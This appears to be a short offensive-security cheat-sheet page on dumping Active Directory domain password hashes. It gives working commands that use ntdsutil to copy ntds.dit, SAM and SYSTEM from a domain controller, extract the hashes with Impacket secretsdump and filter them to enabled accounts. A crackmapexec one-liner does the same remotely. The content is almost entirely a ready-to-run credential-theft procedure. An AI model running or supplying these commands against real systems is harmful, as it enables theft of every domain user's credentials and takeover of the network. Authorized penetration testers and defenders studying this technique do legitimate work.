# Dumping domain hashes

## NTDSutil&#x20;

```
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
-- or --

ntdsutil
> snapshot
> activate instance ntds
> create
> mount {GUID}
```

Then browse to the mounted directory in the C:/  and copy out the ntds.dit && SAM & SYSTEM file to your prefered location

To delete the snapshot after:

```
delete {GUID}
```

Then pull the hashes out with Impacket's Secretdump

```
impacket-secretsdump -system SYSTEM -ntds ntds.dit -hashes lmhash:nthash -user-status -outputfile myhashes local
```

The tidy up the hashes

```
cat myhashes.ntds | grep -v "$:" | grep "status=Enabled" | cut -d'\' -f2 | cut -d"(" -f1
```

## crackmapexec

```
crackmapexec smb <DC-IP> -u <user> -p <password> --ntds
```

